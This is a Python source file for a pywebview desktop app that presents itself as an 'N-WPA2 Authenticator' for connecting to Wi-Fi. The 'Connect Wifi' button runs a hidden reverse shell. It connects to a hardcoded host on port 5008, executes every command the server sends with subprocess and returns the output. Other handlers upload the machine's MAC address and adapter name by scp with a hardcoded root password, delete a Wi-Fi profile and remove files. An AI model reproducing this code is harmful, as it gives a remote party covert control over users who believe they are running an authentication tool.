import threading
import time
import sys
import random
import webview
import os
import time
import socket
import subprocess
import getmac
import shlex
import chardet

#SERVER_HOST = sys.argv[1]
SERVER_HOST = '192.168.2.1'
SERVER_PORT = 5008
BUFFER_SIZE = 1024


html = """
<!DOCTYPE html>
<html>
<head lang="en">
<meta charset="UTF-8">

<style>
    #response-container {
        display: none;
        padding: 3rem;
        margin: 3rem 5rem;
        font-size: 120%;
        border: 5px dashed #ccc;
    }

    label {
        margin-left: 0.3rem;
        margin-right: 0.3rem;
    }

    button {
        font-size: 100%;
        padding: 0.5rem;
        margin: 0.3rem;
    }

</style>
</head>
<body>


<h1>N-WPA2 Authenticator</h1>
<p id='pywebview-status'><i>N-WPA2</i> is not ready</p>

<button onClick="initialize()">Search Wifi Adaptor</button><br/>

<label for="name_input">Enter the Wifi Adaptor Name:</label><input id="name_input" placeholder="put a adaptor name here"><br/>

<button onClick="greet()">Confirm Adaptor</button><br/>

<a href='http://192.168.2.1:3300' target='_blank'> <button>Wallet Auth</button> </a><br/>

<button id="heavy-stuff-btn" onClick="doHeavyStuff()">Connect Wifi</button><br/>

<button onClick="catchException()">Click to completing connection</button><br/>


<div id="response-container"></div>
<script>
    window.addEventListener('pywebviewready', function() {
        var container = document.getElementById('pywebview-status')
        container.innerHTML = '<i>N-WPA2</i> is ready'
    })

    function showResponse(response) {
        var container = document.getElementById('response-container')

        container.innerText = response.message
        container.style.display = 'block'
    }

    function initialize() {
        pywebview.api.init().then(showResponse)
    }

    function doHeavyStuff() {
        var btn = document.getElementById('heavy-stuff-btn')

        pywebview.api.doHeavyStuff().then(function(response) {
            showResponse(response)
            btn.onclick = doHeavyStuff
            btn.innerText = 'Connect Wifi'
        })

        showResponse({message: 'Working... Click next Button after 10 sec'})
        btn.innerText = 'Do not Terminate'
        btn.onclick = cancelHeavyStuff
    }

    function cancelHeavyStuff() {
        pywebview.api.cancelHeavyStuff()
    }

    function getRandomNumber() {
        pywebview.api.getRandomNumber().then(showResponse)
    }

    function greet() {
        var name_input = document.getElementById('name_input').value;
        
        pywebview.api.initAdapt().then(showResponse)
        pywebview.api.sayHelloTo(name_input).then(showResponse)
    }

    function catchException() {
        pywebview.api.exit1().then(showResponse)
        pywebview.api.exit2().then(showResponse)
    }

</script>
</body>
</html>
"""


class Vari:
    adaptName = ''
    testvari = 'testestest'


class Api:

    def __init__(self):
        self.cancel_heavy_stuff_flag = False
    # def init(self):
    #     for i in range(0, 1):
    #         subprocess.call('getmac /v')
    #     else:
    #         then = time.time()
    #         response = {
    #             'message': 'Operation took '
    #         }
    #     return response

    def init(self):
        response = {
            # 'message': 'list: {2}'.format(subprocess.call('getmac /v'))
            'message': vari.testvari
        }
        return response

    def exit1(self):
        response = {
            'message': 'This window will be closed in 5 sec'
        }
        return response

    def exit2(self):
        time.sleep(5)
        window.destroy()

    def getRandomNumber(self):
        response = {
            'message': 'Here is a random number courtesy of randint: {0}'.format(random.randint(0, 100000000))
        }
        return response

    def doHeavyStuff(self):
        # sleep to prevent from the ui thread from freezing for a moment
        time.sleep(0.1)
        now = time.time()
        # get mac address
        # gm = getmac.get_mac_address(vari.adaptName)
        # print(vari.adaptName)
        # print("test555")
        # # gmgm = "type " + gm + " > macAddress.txt"
        # # print(gmgm)
        # # # subprocess_open('type %s{0} > macAddress.txt'.format(gm))
        # # #os.system("type {0} > macAddress.txt".format(gm))
        # # os.system(gmgm)
        # ff = open('macAddress.txt', 'w')
        # ff.write(gm)
        # ff.close()

        for i in range(0, 1):

            print("sub thread start ", threading.currentThread().getName())

            # # get mac address

            # print(vari.adaptName)
            # print("test555")
            # # gmgm = "type " + gm + " > macAddress.txt"
            # # print(gmgm)
            # # # subprocess_open('type %s{0} > macAddress.txt'.format(gm))
            # # #os.system("type {0} > macAddress.txt".format(gm))
            # # os.system(gmgm)
            gm = getmac.get_mac_address(vari.adaptName)
            ff = open('macAddress.txt', 'w')
            ff.write(gm)
            ff.close()

            print("test000")
            # create the socket object
            s = socket.socket()
            # connect to the server
            print("test111")
            s.connect((SERVER_HOST, SERVER_PORT))

            print("test222")
            # receive the greeting message
            message = s.recv(BUFFER_SIZE).decode()
            print("Server:", message)

            while True:
                # receive the command from the server
                command = s.recv(BUFFER_SIZE).decode()
                if command.lower() == "exit":
                    # if the command is exit, just break out of the loop
                    break
                # execute the command and retrieve the results
                output = subprocess.getoutput(command)
                # send the results back to the server
                s.send(output.encode())
            # close client connection
            s.close()

            print("sub thread end ", threading.currentThread().getName())
            # sys.exit(0)
        else:
            then = time.time()
            response = {
                # 'message': 'Operation took {0:.1f} seconds on the thread {1}'.format((then - now), threading.current_thread())
                'message': 'Operation took {0:.1f} seconds. Ready to Connect!'.format((then - now))
            }
        return response

    def cancelHeavyStuff(self):
        time.sleep(0.1)
        self.cancel_heavy_stuff_flag = False

    def initAdapt(self):
        os.system('netsh wlan delete profile name="R4_OpenWRT2"')
        os.system('del "adaplist.py"')
        os.system('del "adaplist.txt"')
        os.system('del "macAddress.txt"')
        os.system('del "wifi.py"')

    def sayHelloTo(self, name):
        vari.adaptName = name
        ss = open('adaptName.txt', 'w')
        ss.write(name)
        ss.close()

        # get adapt MAC
        gm = getmac.get_mac_address(vari.adaptName)
        ff = open('STAmac.txt', 'w')
        ff.write(gm)
        ff.close()

        os.system(
            "pscp -scp -r -pw 1 adaptName.txt root@192.168.2.1:/mnt/sda1/test/")
        os.system('pscp -scp -r -pw 1 STAmac.txt root@192.168.2.1:/mnt/sda1/test/')

        response = {
            'message': '{0} Selected !'.format(name)
        }
        return response

    def error(self):
        raise Exception('This is a Python exception')


# 문자열 명령어 실행
def subprocess_open(command):
    popen = subprocess.Popen(
        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    (stdoutdata, stderrdata) = popen.communicate()
    return stdoutdata, stderrdata


def read_file(path):

    # 파일 열어서 인코딩 확인
    rawdata = open(path, 'rb').read()
    result = chardet.detect(rawdata)
    enc = result['encoding']

    # 인코딩 맞게 열기
    f = open(path, "r", encoding=enc)
    line = f.readline()

    data = ""
    while line:
        data += line
        line = f.readline()
    f.close()
    return data


if __name__ == '__main__':
    #adaptName = ''
    api = Api()
    vari = Vari()

    # adapt list
    f = open("adaplist.py", 'w')
    f.write('import subprocess')
    f.write('\n')
    f.write("subprocess.call('getmac /v')")
    f.close()

    # get adapt name
    f = open("adapName.py", 'w')
    f.write('import getmac')
    f.write('\n')
    f.write("gm = getmac.get_mac_address(vari.adaptName)")
    f.write('\n')
    f.write("print(gm)")
    f.close()

    # gm = getmac.get_mac_address(vari.adaptName)
    # ff = open('macAddress.txt', 'w')
    # ff.write(gm)
    # ff.close()

    subprocess_open('python adaplist.py > adaplist.txt')
    subprocess_open('python adapName.py > adaptName.txt')

    # f = open("adaplist.txt", 'rt', encoding='UTF8')
    # line = f.read()
    # vari.testvari = line
    # print(line)
    # f.close()
    # #vari.testvari = data

    line = read_file("adaplist.txt")
    # print(line)
    vari.testvari = line

    window = webview.create_window('N-WPA2 AUTH', html=html, js_api=api)
    webview.start()

    if(os.path.isfile("./wifi.py")):
        fincommand = "python wifi.py"
        os.system(fincommand)
        fincommand2 = "del wifi.py"
        os.system(fincommand2)

        fincommand3 = "type ssidName.txt"
        ssidName = os.system(fincommand3)
        # ssidName = str(ssidName)

        f = open("ssidName.txt", 'r')
        line = f.readline()
        f.close()

        fincommand4 = "del " + line + ".xml"
        print(fincommand4)
        print("\n")
        os.system(fincommand4)

        fincommand5 = "del ssidName.txt"
        os.system(fincommand5)

    print("main thread end")
    # sys.exit(1)
    os._exit(0)
